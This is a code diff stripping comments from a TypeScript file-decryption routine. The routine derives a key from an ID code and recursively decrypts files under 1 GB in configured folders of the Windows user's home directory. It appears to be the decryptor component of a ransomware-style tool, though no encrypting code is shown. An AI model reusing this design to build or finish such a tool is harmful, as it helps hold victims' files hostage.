@@ -7,9 +7,7 @@ import config from './config.json';
 const decrypt = () => {
   const userName: string = os.userInfo().username;
   const userDir: string = `C:\\Users\\${userName}`;
-  //  const userDir: string = `C:\\Users\\LEONARDO\\encriptar`;
 
-  // get arguments
   const args: string[] = process.argv.slice(2);
 
   if (args.length < 1) {
@@ -21,7 +19,6 @@ const decrypt = () => {
 
   console.log('Starting...\n');
 
-  // get key data
   const keyData: string = decryptPrivateKey(idCode);
 
   const key: string = keyData.substring(0, 32);
@@ -31,7 +28,6 @@ const decrypt = () => {
 
   console.log('Decrypted Files :');
 
-  // decrypt files recursively
   for (let i = 0; i < config.targetFolder.length; i++)
     decryptDir(`${userDir}\\${config.targetFolder[i]}`, key, iv);
 
@@ -39,7 +35,6 @@ const decrypt = () => {
 };
 
 const decryptDir = (dir: string, key: string, iv: Buffer) => {
-  // if directory does not exist
   if (!fs.existsSync(dir)) return;
 
   fs.readdirSync(dir).forEach((file) => {
@@ -47,25 +42,11 @@ const decryptDir = (dir: string, key: string, iv: Buffer) => {
       const fullPath: string = path.join(dir, file);
 
       if (fs.lstatSync(fullPath).isDirectory()) {
-        // if folder
-
-        // recursive call
         decryptDir(fullPath, key, iv);
       } else {
-        // if file
-
         let isTarget: boolean = true;
 
-        // FODA SE EXTENSÃO
-        // for (let j = 0; j < config.targetExtension.length; j++) {
-        //   if (fullPath.toLowerCase().endsWith(config.targetExtension[j])) {
-        //     isTarget = true;
-        //     break;
-        //   }
-        // }
-
         if (isTarget) {
-          // check file size (only under 1GB)
           let fileStat = fs.statSync(fullPath);
           let fileSize = fileStat['size'];
           if (fileSize < 1e9) {
@@ -109,5 +90,4 @@ const decryptPrivateKey = (cipherText: string) => {
   return decryptedBuffer.toString();
 };
 
-// execute
 decrypt();
